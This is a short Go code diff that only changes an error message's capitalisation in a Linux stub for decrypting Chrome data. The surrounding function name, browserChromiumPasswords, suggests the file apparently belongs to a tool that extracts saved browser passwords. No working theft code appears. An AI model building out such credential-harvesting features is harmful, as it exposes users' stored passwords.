@@ -21,5 +21,5 @@ func browserChromiumPasswords(args browserArgs) structs.CommandResult {
 
 // chromeDecryptValue is a stub on Linux — returns an error.
 func chromeDecryptValue(encrypted []byte, key []byte) (string, error) {
-	return "", fmt.Errorf("Chrome decryption not supported on Linux")
+	return "", fmt.Errorf("chrome decryption not supported on Linux")
 }
